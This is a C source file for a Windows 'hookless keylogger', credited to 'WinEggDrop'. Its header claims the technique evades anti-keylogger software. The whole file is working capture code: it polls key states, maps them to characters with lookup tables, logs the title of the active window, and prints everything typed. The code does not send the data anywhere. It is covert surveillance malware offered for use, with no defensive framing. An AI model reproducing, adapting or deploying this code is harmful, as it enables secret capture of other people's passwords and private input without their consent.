//**********************************************************************
// Version: V1.0
// Coder: WinEggDrop
// Date Release: NULL
// Purpose: Hookless Keylogger
// Test PlatForm: Win 2K Pro And Server SP4
// Compiled On: LCC 3.0,May Compile On VC++ 6.0(Not Test Yet)
// Limitation: More Usage Of System Resource; May Not Work On Win9x
// Advantage: Hookless Technique Fools Anti-Keylogger Programs
//**********************************************************************

#include <windows.h>
#include <stdio.h>

// Some Global Variables

// Lower Case Key & Some Other Keys
char *LowerCase[]={
"b",
"e",
"[ESC]",
"[F1]",
"[F2]",
"[F3]",
"[F4]",
"[F5]",
"[F6]",
"[F7]",
"[F8]",
"[F9]",
"[F10]",
"[F11]",
"[F12]",
"`",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
"0",
"-",
"=",
"[TAB]",
"q",
"w",
"e",
"r",
"t",
"y",
"u",
"i",
"o",
"p",
"[",
"]",
"a",
"s",
"d",
"f",
"g",
"h",
"j",
"k",
"l",
";",
"'",
"z",
"x",
"c",
"v",
"b",
"n",
"m",
",",
".",
"/",
"\\",
"[CTRL]",
"[WIN]",
" ",
"[WIN]",
"[Print Screen]",
"[Scroll Lock]",
"[Insert]",
"[Home]",
"[PageUp]",
"[Del]",
"[End]",
"[PageDown]",
"[Left]",
"[UP]",
"[Right]",
"[Down]",
"[Num Lock]",
"/",
"*",
"-",
"+",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
".",
};

// Upper Case Key & Some Other Keys
char *UpperCase[]={
"b",
"e",
"[ESC]",
"[F1]",
"[F2]",
"[F3]",
"[F4]",
"[F5]",
"[F6]",
"[F7]",
"[F8]",
"[F9]",
"[F10]",
"[F11]",
"[F12]",
"~",
"!",
"@",
"#",
"$",
"%",
"^",
"&",
"*",
"(",
")",
"_",
"+",
"[TAB]",
"Q",
"W",
"E",
"R",
"T",
"Y",
"U",
"I",
"O",
"P",
"{",
"}",
"A",
"S",
"D",
"F",
"G",
"H",
"J",
"K",
"L",
":",
"\"",
"Z",
"X",
"C",
"V",
"B",
"N",
"M",
"<",
">",
".?",
"|",
"[CTRL]",
"[WIN]",
" ",
"[WIN]",
"[Print Screen]",
"[Scroll Lock]",
"[Insert]",
"[Home]",
"[PageUp]",
"[Del]",
"[End]",
"[PageDown]",
"[Left]",
"[Up]",
"[Right]",
"[Down]",
"[Num Lock]",
"/",
"*",
"-",
"+",
"0",
"1",
"2",
"3",
"4",
"5",
"6",
"7",
"8",
"9",
".",
};

// Ascii Keys,Forget About It
int SpecialKeys[]={
8,
13,
27,
112,
113,
114,
115,
116,
117,
118,
119,
120,
121,
122,
123,
192,
49,
50,
51,
52,
53,
54,
55,
56,
57,
48,
189,
187,
9,
81,
87,
69,
82,
84,
89,
85,
73,
79,
80,
219,
221,
65,
83,
68,
70,
71,
72,
74,
75,
76,
186,
222,
90,
88,
67,
86,
66,
78,
77,
188,
190,
191,
220,
17,
91,
32,
92,
44,
145,
45,
36,
33,
46,
35,
34,
37,
38,
39,
40,
144,
111,
106,
109,
107,
96,
97,
98,
99,
100,
101,
102,
103,
104,
105,
110,
};

char KeyBuffer[600];     // Key Buffer Array
HWND PreviousFocus=NULL;
// End Of Data

// Function ProtoType Declaration
//----------------------------------------------------------------------
BOOL IsWindowsFocusChange();
BOOL KeyLogger();
//----------------------------------------------------------------------
// End Of Fucntion ProtoType Declaration

// Main Function
int main()
{
KeyLogger();	// Run The Keylogger
return 0;		// The Program Quit
}
// End Of Main

//-------------------------------------------------------------------------
// Purpose: To Check The Active Windows Title
// Return Type: Boolean
// Parameters: NULL
//-------------------------------------------------------------------------
BOOL IsWindowsFocusChange()
{
HWND hFocus = GetForegroundWindow();				// Retrieve The Active Windows's Focus
BOOL ReturnFlag = FALSE;							// Declare The Return Flag
if (hFocus != PreviousFocus)						// The Active Windows Has Change
{
	if(strlen(KeyBuffer) != 0)						// Keys Are Pressed
		{
		printf("%s\r\n",KeyBuffer);					// Display The Keys Pressed
		memset(KeyBuffer,0,sizeof(KeyBuffer));      // reset The Buffer
		}

	PreviousFocus = hFocus;													// Save The Old Active Windos Focus
	int WinLeng = GetWindowTextLength(hFocus);								// Get The Active Windows's Caption's Length
	char *WindowCaption = (char*) malloc(sizeof(char) * (WinLeng + 2));		// Allocate Memory For The Caption
	GetWindowText(hFocus,WindowCaption,(WinLeng + 1));						// Retrieve The Active Windows's Caption
	if (strlen(WindowCaption) > 0)											// Really Get The Windows's Caption
		{
		printf("\r\nThe Active Windows Title: %s\r\n",WindowCaption);		// Display The Active Windows's Caption
		ReturnFlag=TRUE;													// Indicate The Windows's Focus Has Changed
		}
	free(WindowCaption);													// Free The Allocated Memory
}

return ReturnFlag;
}// End Of IsWindowsFocusChange Function

//-------------------------------------------------------------------------
// Purpose: To Manage(Display)The Keys Retrieved From System's Key Buffer
// Return Type: Boolean
// Parameters: NULL
//-------------------------------------------------------------------------
BOOL KeyLogger()
{
int  i;
int  x;
int  bKstate[256] = {0};     // Declare The Key State Array
int  state;					// Variable To Hode State Of Some Special Key Like CapsLock,Shift And ect
int  shift;					// Variable To Hode State Of Shift Key

// Reset The Buffer	
memset(KeyBuffer,0,sizeof(KeyBuffer));

while(TRUE)     // Forever Loop Is Taking Place Here
{
	Sleep(3);   // Rest For A While,And Avoid Taking 100% CPU Usage.Pretty Important To Add This Line Or The System Gets FuckedUP

	if (IsWindowsFocusChange())			//Check The Active Windows Title
	{
	}

	for( i = 0; i < 95; i++ )			// Looping To Check Visual Keys
	{
	shift = GetKeyState(VK_SHIFT);		// Check Whether Shift Is Pressed
	x = SpecialKeys[i];					// Match The Key
	if (GetAsyncKeyState(x) & 0x8000)   // Check Combination Keys
		{
		// See Whether CapsLocak Or Shift Is Pressed
		if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))		//Caps Lock And Shift Is Not Pressed
			{
			bKstate[x] = 1;																	//Uppercase Characters A-Z
			}
		else if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))   //Caps Lock And Shift Is Pressed
			{
			bKstate[x] = 2;										//Lowercase a-z
			}
		else if (shift < 0)										// Shift Is Pressed
			{
            bKstate[x] = 3;										//Uppercase Characters A-Z
			}
        else
			{
            bKstate[x] = 4;										//Lowercase a-z
			}
		}
	else
		{
		if (bKstate[x] != 0)									// No Combination Keys Detected
			{
			state = bKstate[x];									// Retrieve The Current State
			bKstate[x] = 0;										// Reset The Current State
			if (x == 8)											// Back Space Is Detected
				{
				KeyBuffer[strlen(KeyBuffer) - 1] = 0;			// One Key Back Then
				continue;										// Start A New Loop
				}
			else if (strlen(KeyBuffer) > 550)					// Buffer FULL
				{
				printf("%s <Buffer Full>",KeyBuffer);			// Display The Keys Retrieved
				memset(KeyBuffer,0,sizeof(KeyBuffer));			// Reset The Buffer
				continue;										// Start A New Loop
				}
			else if (x == 13)									// Enter Is Detected
				{
				if (strlen(KeyBuffer) == 0)						// No Other Keys Retrieved But Enter
					{
					continue;									// Start A New Loop
					}
				printf("%s<Enter>\r\n",KeyBuffer);				// Retrieve Other Keys With Enter
				memset(KeyBuffer,0,sizeof(KeyBuffer));			// Display The Keys With Enter
				continue;										// Start A New Loop
				}
			else if ((state%2) == 1)							//Must Be Upper Case Characters
				{	
				strcat(KeyBuffer,UpperCase[i]);					// Store The Key To Key Buffer
				}
			else if ((state%2) == 0)							// Must Be Lower Case Characters
				{
				strcat(KeyBuffer,LowerCase[i]);					// Store The Key To Key Buffer
				}
			}
		}
	}// End Of For Loop

}// End Of While Loop

return TRUE; 
}// End Of KeyLogger Function
// End Of File
